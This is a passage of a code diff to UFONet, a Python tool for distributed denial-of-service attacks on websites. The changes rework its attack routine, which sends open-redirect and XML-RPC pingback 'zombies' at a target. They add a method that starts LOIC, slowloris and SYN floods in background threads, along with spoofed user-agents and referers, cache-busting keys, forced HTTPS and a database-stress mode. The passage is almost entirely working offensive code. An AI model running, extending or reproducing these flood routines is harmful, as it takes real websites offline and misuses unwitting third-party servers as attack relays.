             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             key = random_key(8) # generate random value page to bypass cache
             rpc_page = "?" + str(key)
@@ -2307,7 +2595,7 @@ class UFONet(object):
     def search_rpc(self, rpc_host):
         rpc_vulnerable = False
         rpc_pingback_url = False
-        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         try:
             if self.options.testall: # testing_all
@@ -2350,7 +2638,7 @@ class UFONet(object):
                             rpc_pingback_url = rpc_host + "/xmlrpc.php"
                             rpc_vulnerable = False
         except: # something wrong discovering XML-RPC Pingback
-            rpc_vulnerable = False
+            pass
         return rpc_vulnerable, rpc_pingback_url
 
     def testing_offline(self):
@@ -2484,7 +2772,7 @@ class UFONet(object):
         print "Trying:", len(rpcs)
         print '-'*21
         for rpc in rpcs:
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if rpc.startswith("http://") or rpc.startswith("https://"):
                 print "Searching 'Pingback' on", rpc
@@ -2708,15 +2996,56 @@ class UFONet(object):
     def attacking(self, zombies):
         # perform a DDoS Web attack against a target, using Open Redirect vectors (and other Web Abuse services) as 'zombies'
         target = self.options.target
-        if target.startswith("https://"):
-            target = target.replace("https://", "http://") # change target to 'http' (to evade a possible invalid SSL certificate)
-        if target.startswith("http://"):
-            print "Attacking: ", target
+        if self.options.forcessl:
+            if target.startswith("http://"):
+                target = target.replace("http://", "https://") # force SSL/TLS 
+        if target.startswith("http://") or target.startswith("https://"):
+            print "Attacking:", target
             print '='*55, "\n"
             # send Open Redirect injection (multiple zombies > one target url)
             reply = self.injection(target, zombies)
         else:
             print "\n[Error] - Target url not valid! -> It should starts with 'http(s)://'\n"
+
+    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn):
+        # perform some other extra attacks (such as DoS techniques)
+        time.sleep(2) # aiming (multi-threading flow time compensation)
+        if loic:
+            try:
+                self.options.loic = int(loic)
+            except:
+                self.options.loic = 100 # default LOIC requests
+            if self.options.loic < 1:
+                self.options.loic = 100
+            self.instance = LOIC() # instance main class for LOIC operations
+            t = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, proxy)) # LOIC using threads + proxy
+            t.daemon = True
+            t.start()
+            self.update_loic_stats() # add new LOIC attack to mothership
+        if loris:
+            try:
+                self.options.loris = int(loris)
+            except:
+                self.options.loris = 101 # default LORIS requests (apache -> max_clients: ~100 | nginx -> no limit (other method))
+            if self.options.loris < 1:
+                self.options.loris = 101 
+            self.instance = LORIS() # instance main class for LORIS operations
+            t2 = threading.Thread(target=self.instance.attacking, args=(target, self.options.loris)) # LORIS using threads
+            t2.daemon = True
+            t2.start()
+            self.update_loris_stats() # add new LORIS attack to mothership
+        if ufosyn:
+            try:
+                self.options.ufosyn = int(ufosyn)
+            except:
+                self.options.ufosyn = 100 # default UFOSYN requests
+            if self.options.ufosyn < 1:
+                self.options.ufosyn = 100 
+            self.instance = UFOSYN() # instance main class for UFOSYN operations
+            t3 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufosyn)) # UFOSYN using threads
+            t3.daemon = True
+            t3.start()
+            self.update_ufosyn_stats() # add new UFOSYN attack to mothership
 
     def stressing(self, target, zombie):
         # perform a DDoS Web attack against a target, requesting records on target's database
@@ -2737,7 +3066,7 @@ class UFONet(object):
             print "\n[Info] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)"
         else:
             print "\n[Info] Trying database request to: " + db_input + " | Query used: " + key
-        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         if not target.endswith('/'): # add "/" to end of target
             target = target + "/"
@@ -2776,7 +3105,7 @@ class UFONet(object):
         options = self.options
         head_check_here = False
         head_check_external = False
-        print '='*21
+        print '='*22
         if options.disablehead: # check at start is disabled (skipping!)
             print "\n[Info] Skipping external check of target's status...\n"
             head_check_here = True
@@ -2785,7 +3114,7 @@ class UFONet(object):
             if head_check:
                 if not options.attackme:
                     print "Round: 'Is target up?'"
-                    print '='*21
+                    print '='*22
                     try: # send HEAD connection
                         self.head = True
                         reply = self.connect_zombie(target)
@@ -2794,10 +3123,10 @@ class UFONet(object):
                             print "[Info] From here: YES"
                             head_check_here = True
                         else:
-                            print "[Info] From Here: NO | Report: From here your target looks DOWN!"
+                            print "[Error] From here: NO | Report: From your network your target looks DOWN!..."
                             head_check_here = False
                     except Exception:
-                        print "[Error] From Here: NO | Report: Check failed from your connection..."
+                        print "[Error] From here: NO | Report: Cannot reach your target from your network..."
                         if self.options.verbose:
                             traceback.print_exc()
                         head_check_here = False
@@ -2807,7 +3136,7 @@ class UFONet(object):
                     try:
                         sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                         result = sock.connect_ex(('0.0.0.0',8080))
-                        if result == 0 or result == 110: # tmp black magic
+                        if result == 0 or result == 110: # black magic
                             print "[Info] Local port: YES | Report: Mothership accesible on -private- IP: http://0.0.0.0:8080"
                             head_check_here = True
                         else:
@@ -2829,20 +3158,20 @@ class UFONet(object):
                     if "It's just you" in external_reply: # parse from external service: http://www.downforeveryoneorjustme.com
                         print "[Info] From exterior: YES"
                         head_check_external = True
-                    else: # parse from external service: http://isup.me
-                        url = "http://isup.me/" + target
-                        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+                    else: # parse from external service: http://isup.me [29/08/2018 -> DEPRECATED!] | https://status.ws/
+                        url = "https://status.ws/" + target
+                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
                         req = urllib2.Request(url, None, headers)
                         req_reply = urllib2.urlopen(req).read()
-                        if 'is up' in req_reply: # parse external service for reply
+                        if 'may be just down for you' in req_reply: # parse external service for reply
                             print "[Info] From exterior: YES"
                             head_check_external = True
                         else:
-                            print "[Info] From exterior: NO | Report: From external services your target looks DOWN!"
+                            print "[Error] From exterior: NO | Report: From external services your target looks DOWN!"
                             head_check_external = False
                 except Exception:
-                        print "[Error] From exterior: NO | Cannot reach external services from your network..."
+                        print "[Error] From exterior: NO | Report: Cannot reach external services from your network..."
                         head_check_external = False
             else:
                 try: # check mothership from public ip / NAT using HEAD request
@@ -2853,10 +3182,10 @@ class UFONet(object):
                     except Exception:
                         reply = None
                     if reply:
-                        print "[Info] From exterior: YES | Report: Mothership accesible from Internet ;-)"
+                        print "[Info] From exterior: YES | Report: Mothership accesible from the Internet ;-) ["+str(self.pub_ip)+":8080]"
                         head_check_external = True
                     else:
-                        print "[Error] From exterior: NO | Report: Cannot access to mothership on -public- url:", target
+                        print "[Error] From exterior: NO | Report: Cannot access to the mothership using a public IP. Your NAT configuration is not working correctly:", target
                         head_check_external = False
                         head_check_here = False # stop attack if not public IP available
                 except Exception:
@@ -2865,7 +3194,7 @@ class UFONet(object):
                     if self.options.verbose:
                         traceback.print_exc()
                     head_check_external = False
-            print '-'*21
+            print '-'*21 + "\n"
             self.external = False
         # ask for start the attack
         if head_check_here == True or head_check_external == True:
@@ -2893,33 +3222,9 @@ class UFONet(object):
                 num_round = 1
                 num_hits = 0
                 num_zombie = 1
-                # start multi-threading DoS Web LOIC (Low Orbit Ion Cannon) with proxy support, if required
-                if self.options.loic:
-                    try:
-                        self.options.loic = int(self.options.loic)
-                    except:
-                        self.options.loic = 100 # default LOIC requests
-                    if self.options.loic < 1:
-                        self.options.loic = 100 # default LOIC requests
-                    self.instance = LOIC() # instance main class for LOIC operations
-                    t = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, self.options.proxy)) # attack with LOIC
-                    t.daemon = True
-                    t.start()
-                    self.update_loic_stats() # add new LOIC attack to mothership
-                # start multi-threading DoS Slow+Poison HTTP requests (UFOLoris)
-                if self.options.slow:
-                    try:
-                        self.options.slow = int(self.options.slow)
-                    except:
-                        self.options.slow = 101 # default UFOLoris requests (apache -> max_clients: ~100 | nginx -> no limit (other method))
-                    if self.options.slow < 1:
-                        self.options.slow = 101 # default UFOLoris requests
-                    self.instance = LORIS() # instance main class for UFOLoris operations
-                    t = threading.Thread(target=self.instance.attacking, args=(target, self.options.slow)) # attack with UFOLoris
-                    t.daemon = True
-                    t.start()
-                    self.update_loris_stats() # add new LORIS attack to mothership
-                    time.sleep(5)
+                t = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn)) # multithreading flow for extra attacks
+                t.daemon = True
+                t.start()
                 # start to attack the target with each zombie
                 zombies = self.extract_zombies() # extract zombies from file
                 total_zombie = len(zombies)
@@ -2935,7 +3240,7 @@ class UFONet(object):
                         send_droids = self.send_droids(target)
                     if not self.options.disablerpcs and not self.options.attackme: # exploit XML-RPC pingback vulnerability 
                         send_rpcs = self.send_rpcs(target)
-                    shuffle(zombies) # suffle zombies order, each round :-)
+                    shuffle(zombies) # shuffle zombies order, each round :-)
                     self.herd.reset()
                     print "\n[Info] Sending your 'herd' of zombies...\n"
                     for zombie in zombies:
@@ -2943,7 +3248,7 @@ class UFONet(object):
                         name_zombie = t.netloc
                         if not self.options.attackme:
                             print "[Info] Attacking from: " + name_zombie
-                        else: # on attackme target url is dynamic -> http://public_ip:port/hash|zombie
+                        else: # on attackme, target url is dynamic -> http://public_ip:port/hash|zombie
                             self.mothership_hash = random.getrandbits(128) # generating random evasion hash  
                             target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
                             self.options.target = target
@@ -2951,9 +3256,12 @@ class UFONet(object):
                             print "Payload: " + target
                             print '='*55, "\n"
                         self.attack_mode = True
-                        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                         if not options.target.startswith('http'):
-                            options.target = "http://" + options.target
+                            if options.forcessl:
+                                options.target = "https://" + options.target
+                            else:
+                                options.target = "http://" + options.target
                         self.connect_zombies(zombie)
                         if self.options.dbstress: # try to stress db on target by using vulnerable Open Redirect web servers
                             self.db_flash = self.db_flash + 1
@@ -2970,6 +3278,8 @@ class UFONet(object):
                     num_round = num_round + 1
                     if not self.options.disableisup and not self.options.attackme: # perform an external 'is target up?' check 
                         check_is_up = self.check_is_up(target)
+                    if not self.options.attackme: # perform a broadband test on target
+                        check_is_loading = self.check_is_loading(target)
                     print "-"*21
                     self.herd.dump_html()
                 attack_mode = False
@@ -2980,7 +3290,7 @@ class UFONet(object):
                     print '='*21
                     print "\n[Info] - Mothership transmission...\n"
                     num_real_zombies = len(self.doll.real_zombies)
-                    print "Total 'zombies' 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n"
+                    print "Total of 'zombies' 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n"
                     for z in self.doll.real_zombies: # show only alien verified zombies
                         for x in z:
                             print " - " + str(x)
@@ -3008,7 +3318,9 @@ class UFONet(object):
                     return
         else:
             if not options.attackme:
-                print "[Info] Your target ("+target+") is OFFLINE!! ;-)" 
+                print "="*75
+                print "[Info] Your target ("+target+") looks OFFLINE!! ;-)" 
+                print "="*75
             else:
                 print "[Error] Your NAT/Network is not correctly configurated..."
             print '-'*25
@@ -3017,10 +3329,7 @@ class UFONet(object):
                 os.remove('mothership') # remove mothership stream
             if os.path.exists('alien') == True:
                 os.remove('alien') # remove random alien worker
-            if not options.web:
-                sys.exit(2) # exit
-            else:
-                return
+            return
 
 if __name__ == "__main__":
     app = UFONet()
